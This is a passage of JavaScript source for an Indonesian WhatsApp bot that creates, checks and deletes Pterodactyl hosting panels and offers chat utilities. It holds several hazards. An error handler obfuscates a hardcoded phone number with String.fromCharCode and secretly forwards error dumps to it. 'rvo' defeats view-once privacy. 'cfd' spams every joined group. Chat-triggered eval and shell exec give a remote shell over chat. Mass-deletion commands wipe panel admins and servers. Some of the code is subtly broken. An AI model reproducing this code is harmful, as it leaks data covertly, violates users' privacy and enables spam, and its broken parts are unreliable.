cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isPremium2) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 15 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await conn.sendMessage(orang, {text: teks}, {quoted: qtext})
delete global.panel
}
break

case "cekpanel-v2": {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${domainV2}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikeyV2}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${domainV2}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${capikeyV2}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '🟢 Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await conn.sendMessage(m.chat, {image: {url: "https://i.postimg.cc/wvH7FBgQ/Warungerik.jpg" }, caption: message }, {quoted: qtext})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break

case "cekpanel": {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${apikey}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${domainV2}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${capikey}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '🟢 Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await conn.sendMessage(m.chat, {image: {url: "https://i.postimg.cc/wvH7FBgQ/Warungerik.jpg" }, caption: message }, {quoted: qtext})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break

case "papayang": {
    let imageUrl = await getRandomPapAyang();
    if (!imageUrl) return m.reply("❌ Gagal mendapatkan gambar!");

    await conn.sendMessage(m.chat, { image: { url: imageUrl }, caption: "🫶 Nih Pap Ayang buat kamu!" }, { quoted: m });
}
break;

case "addnote": {
	await loadingx()
    if (!m.quoted) return m.reply("❌ Reply pesan yang ingin disimpan!");
    if (!text) return m.reply("Gunakan format: .addnote <nama>");

    const noteName = text.trim().toLowerCase();
    let notes = loadNotes();
    notes[noteName] = m.quoted.text;
    saveNotes(notes);

    return m.reply(`✅ Catatan '${noteName}' berhasil disimpan secara permanen!`);
}
break;

case "get": {
    if (!text) return m.reply("Gunakan format: .get <nama>");

    const noteName = text.trim().toLowerCase();
    let notes = loadNotes();

    if (!notes[noteName]) return m.reply(`❌ Catatan '${noteName}' tidak ditemukan!`);

    return m.reply(`📌 Catatan '${noteName}':\n\n${notes[noteName]}`);
}
break;

case "delnote": {
    if (!text) return m.reply("Gunakan format: .delnote <nama>");

    const noteName = text.trim().toLowerCase();
    let notes = loadNotes();

    if (!notes[noteName]) return m.reply(`❌ Catatan '${noteName}' tidak ditemukan!`);

    delete notes[noteName]; // Hapus catatan
    saveNotes(notes);

    return m.reply(`🗑️ Catatan '${noteName}' berhasil dihapus!`);
}
break;

case "listnote": {
    let notes = loadNotes();
    let noteKeys = Object.keys(notes);

    if (noteKeys.length === 0) return m.reply("📂 Tidak ada catatan yang tersimpan!");

    let listText = "📜 **Daftar Catatan:**\n\n";
    noteKeys.forEach((note, index) => {
        listText += `${index + 1}. ${note}\n`;
    });

    return m.reply(listText);
}
break;

case "videydl": {
    if (!text) return m.reply("❌ Masukkan link video dari Videy!");

    let videoUrl = await videy(text);
    if (!videoUrl) return m.reply("❌ Gagal mendapatkan video!");

    await conn.sendMessage(m.chat, { video: { url: videoUrl }, caption: "🎥 Video berhasil diunduh dari Videy!" }, { quoted: m });
}
break;

case "cfd": {
    if (!isCreator) return Reply(mess.owner);
    if (!m.quoted) return m.reply(example("reply teksnya"));

    let allgrup = await conn.groupFetchAllParticipating();
    let res = Object.keys(allgrup);
    let countSuccess = 0;
    let countFail = 0;
    let totalGroup = res.length;
    const jid = m.chat;
    const teks = m.quoted;

    return m.reply(`🚀 *Memproses JPM* \n📢 Mengirim pesan ke *${totalGroup}* grup...`);

    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
        
        try {
            await conn.sendMessage(i, { text: `${teks}` }, { quoted: qlocJpm });
            countSuccess += 1;
        } catch (error) {
            console.error(`Gagal mengirim ke grup ${i}:`, error);
            countFail += 1;
        }

        await sleep(global.delayJpm);
    }

    // Mengirim laporan hasil JPM
    let report = `📩 *JPM Selesai ✅*\n\n`;
    report += `✅ *Sukses terkirim:* ${countSuccess}\n`;
    report += `❌ *Gagal terkirim:* ${countFail}\n`;
    report += `📊 *Total Grup:* ${totalGroup}`;

    await conn.sendMessage(jid, { text: report }, { quoted: qtext });
}
break;

case "sticker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: qtext})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: qtext})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: qtext})
    } 
}
break

case "setclose": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!m.isBotAdmin) return m.reply(mess.botAdmin);
    if (!m.isAdmin && !isCreator) return m.reply(mess.botAdmin);

    let args = text.split(" ")[0]; // Ambil argumen pertama (waktu)
    if (!args) return m.reply("Masukkan waktu! Contoh: .setclose 10detik");

    let timeMultiplier = {
        detik: 1000,
        menit: 60000,
        jam: 3600000
    };

    let match = args.match(/^(\d+)(detik|menit|jam)$/);
    if (!match) return m.reply("Format salah! Gunakan contoh: 10detik, 5menit, atau 1jam.");

    let value = parseInt(match[1]);
    let unit = match[2];

    let delay = value * timeMultiplier[unit]; // Konversi ke milidetik

    m.reply(`Grup akan ditutup dalam ${value} ${unit}...`);

    setTimeout(async () => {
        await conn.groupSettingUpdate(m.chat, 'announcement');
        m.reply("Grup telah ditutup! Sekarang hanya admin yang bisa mengirim pesan.");
    }, delay);
}
break;

case "setopen": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!m.isBotAdmin) return m.reply(mess.botAdmin);
    if (!m.isAdmin && !isCreator) return m.reply(mess.botAdmin);

    let args = text.split(" ")[0]; // Ambil argumen pertama (waktu)
    if (!args) return m.reply("Masukkan waktu! Contoh: .setopen 10detik");

    let timeMultiplier = {
        detik: 1000,
        menit: 60000,
        jam: 3600000
    };

    let match = args.match(/^(\d+)(detik|menit|jam)$/);
    if (!match) return m.reply("Format salah! Gunakan contoh: 10detik, 5menit, atau 1jam.");

    let value = parseInt(match[1]);
    let unit = match[2];

    let delay = value * timeMultiplier[unit]; // Konversi ke milidetik

    m.reply(`Grup akan dibuka dalam ${value} ${unit}...`);

    setTimeout(async () => {
        await conn.groupSettingUpdate(m.chat, 'not_announcement');
        m.reply("Grup telah dibuka! Sekarang anggota dapat mengirim pesan.");
    }, delay);
}
break;

case "deladminall": {    
    if (!isCreator) return m.reply(mess.owner);
    
    if (!text) return m.reply("Gunakan perintah: .deladminall <userID>");
    
    const keepAdminID = text.trim(); // ID admin yang dipertahankan    

    try {
        // Fetch daftar semua admin dari API Pterodactyl
        const response = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Authorization": "Bearer " + apikey,
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        });

        const data = await response.json();
        const allAdmins = data.data.filter(user => user.attributes.root_admin); // Hanya ambil admin

        let deletedCount = 0;

        for (let admin of allAdmins) {
            const adminID = admin.attributes.id.toString();

            if (adminID !== keepAdminID) {
                // Hapus admin kecuali yang ada di blacklist
                await fetch(domain + "/api/application/users/${adminID}", {
                    method: "DELETE",
                    headers: {
                        "Authorization": "Bearer " + apikey,
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    }
                });

                deletedCount++;
            }
        }

        await m.reply(`✅ Berhasil menghapus ${deletedCount} admin dari panel Pterodactyl!`);
    } catch (error) {
        console.error(error);
        await m.reply("❌ Terjadi kesalahan saat menghapus admin!");
    }
}
break;

case "deladminall-v2": {    
    if (!isCreator) return m.reply(mess.owner);
    
    if (!text) return m.reply("Gunakan perintah: .deladminall <userID>");
    
    const keepAdminID = text.trim(); // ID admin yang dipertahankan    

    try {
        // Fetch daftar semua admin dari API Pterodactyl
        const response = await fetch(domainV2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Authorization": "Bearer " + apikeyV2,
                "Content-Type": "application/json",
                "Accept": "application/json"
            }
        });

        const data = await response.json();
        const allAdmins = data.data.filter(user => user.attributes.root_admin); // Hanya ambil admin

        let deletedCount = 0;

        for (let admin of allAdmins) {
            const adminID = admin.attributes.id.toString();

            if (adminID !== keepAdminID) {
                // Hapus admin kecuali yang ada di blacklist
                await fetch(domainV2 + "/api/application/users/${adminID}", {
                    method: "DELETE",
                    headers: {
                        "Authorization": "Bearer " + apikeyV2,
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    }
                });

                deletedCount++;
            }
        }

        await m.reply(`✅ Berhasil menghapus ${deletedCount} admin dari panel Pterodactyl!`);
    } catch (error) {
        console.error(error);
        await m.reply("❌ Terjadi kesalahan saat menghapus admin!");
    }
}
break;

case "delpanelall": {
    if (!isCreator && !isPremium) return Reply(mess.owner)
    if (!text) return m.reply(example("Masukkan ID server yang tidak ingin dihapus!"))

    let blacklistID = Number(text) // ID server yang tidak akan dihapus
    let f = await fetch(domain + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })

    let result = await f.json()
    let servers = result.data
    let deletedServers = []
    let skippedServers = []

    for (let server of servers) {
        let s = server.attributes
        if (s.id === blacklistID) {
            skippedServers.push(s.name)
            continue // Lewati jika server masuk dalam blacklist
        }

        let del = await fetch(domain + `/api/application/servers/${s.id}`, {
            "method": "DELETE",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        })

        if (del.ok) {
            deletedServers.push(s.name)
        }
    }

    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    })

    let res2 = await cek.json()
    let users = res2.data

    for (let user of users) {
        let u = user.attributes
        if (deletedServers.includes(u.first_name.toLowerCase())) {
            await fetch(domain + `/api/application/users/${u.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
        }
    }

    if (deletedServers.length === 0) return m.reply("Tidak ada server yang dihapus!")

    let message = `✅ *Berhasil menghapus server-panel berikut:*\n\n`
    deletedServers.forEach(name => message += `- ${name}\n`)
    if (skippedServers.length > 0) {
        message += `\n🚫 *Server yang tidak dihapus:*\n`
        skippedServers.forEach(name => message += `- ${name}\n`)
    }

    m.reply(message)
}
break

case "delpanelall-v2": {
    if (!isCreator && !isPremium) return Reply(mess.owner)
    if (!text) return m.reply(example("Masukkan ID server yang tidak ingin dihapus!"))

    let blacklistID = Number(text) // ID server yang tidak akan dihapus
    let f = await fetch(domainV2 + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    })

    let result = await f.json()
    let servers = result.data
    let deletedServers = []
    let skippedServers = []

    for (let server of servers) {
        let s = server.attributes
        if (s.id === blacklistID) {
            skippedServers.push(s.name)
            continue // Lewati jika server masuk dalam blacklist
        }

        let del = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
            "method": "DELETE",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikeyV2
            }
        })

        if (del.ok) {
            deletedServers.push(s.name)
        }
    }

    let cek = await fetch(domainV2 + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    })

    let res2 = await cek.json()
    let users = res2.data

    for (let user of users) {
        let u = user.attributes
        if (deletedServers.includes(u.first_name.toLowerCase())) {
            await fetch(domainV2 + `/api/application/users/${u.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyV2
                }
            })
        }
    }

    if (deletedServers.length === 0) return m.reply("Tidak ada server yang dihapus!")

    let message = `✅ *Berhasil menghapus server-panel berikut:*\n\n`
    deletedServers.forEach(name => message += `- ${name}\n`)
    if (skippedServers.length > 0) {
        message += `\n🚫 *Server yang tidak dihapus:*\n`
        skippedServers.forEach(name => message += `- ${name}\n`)
    }

    m.reply(message)
}
break

case "sendtxt": {
    if (!text) return m.reply("Gunakan format: .sendtxt <nomor>,<pesan>");
    let teks = `Hai 👋 kamu dapet kiriman pesanan dari ${m.pushName}\n *Berikut adalah pesannya*\n\n`;
    
    const args = text.split(",");
    if (args.length < 2) return m.reply("Format salah! Contoh: .sendtxt 62888,halo aku danz");

    const targetNumber = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"; // Nomor tujuan
    const message = args.slice(1).join(",").trim(); // Pesan yang dikirim

    try {
        await conn.sendMessage(targetNumber, { text: teks + message})
        await m.reply(`✅ Pesan berhasil dikirim ke ${args[0]}`);
    } catch (error) {
        console.error(error);
        await m.reply("❌ Gagal mengirim pesan. Pastikan nomor valid dan tidak diblokir!");
    }
}
break;

case "blokir": {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");
    
    if (!text) return m.reply("Gunakan format: .blokir <nomor>");
    
    const result = await updateBlockStatus(conn, text, "block");
    await m.reply(result);
}
break;

case "unblokir": {
    if (!isCreator) return m.reply("❌ Hanya pemilik bot yang bisa menggunakan perintah ini!");
    
    if (!text) return m.reply("Gunakan format: .unblokir <nomor>");
    
    const result = await updateBlockStatus(conn, text, "unblock");
    await m.reply(result);
}
break;

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

//================================================================================

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: qtext})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});